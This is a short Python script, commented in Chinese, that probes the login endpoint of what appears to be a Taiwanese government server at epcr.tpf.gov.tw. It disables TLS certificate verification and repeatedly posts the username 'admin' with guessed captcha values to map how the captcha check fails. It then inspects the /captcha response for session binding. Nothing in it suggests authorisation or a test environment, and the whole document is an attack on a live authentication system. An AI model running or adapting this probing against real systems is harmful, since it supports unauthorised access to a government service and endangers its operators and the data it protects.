import json, ssl, urllib.request, urllib.error, time
CTX=ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE
BASE="https://epcr.tpf.gov.tw:4004"
def post_login(body):
    req=urllib.request.Request(BASE+"/login",data=json.dumps(body).encode(),method="POST",
        headers={"Content-Type":"application/json","User-Agent":"Mozilla/5.0"})
    try:
        r=urllib.request.urlopen(req,timeout=12,context=CTX); return r.status, r.read().decode("utf-8","replace")
    except urllib.error.HTTPError as e: return e.code, e.read().decode("utf-8","replace")
    except Exception as e: return None, repr(e)

# 厘清 captcha 与 500 的关系
print("=== captcha 影响测试 (admin/x) ===")
for cap in ["1","",None,"abc","1234","123456","correct","true"]:
    d={"username":"admin","password":"x","domain":"AUTH_SERVER"}
    if cap is not None: d["captcha"]=cap
    code,b=post_login(d)
    print(f"  captcha=[{str(cap):8s}] -> {code} | {b[:60]}")
    time.sleep(0.1)

# 先 GET /captcha 看是否有 session 绑定
print("\n=== GET /captcha (检查响应) ===")
req=urllib.request.Request(BASE+"/captcha",method="GET",headers={"User-Agent":"Mozilla/5.0"})
try:
    r=urllib.request.urlopen(req,timeout=12,context=CTX)
    print(f"  status={r.status} ct={r.headers.get('Content-Type')} len={len(r.read())}")
    print(f"  set-cookie={r.headers.get('Set-Cookie')}")
except urllib.error.HTTPError as e: print(f"  {e.code} | {e.read()[:80]}")
print("DONE")
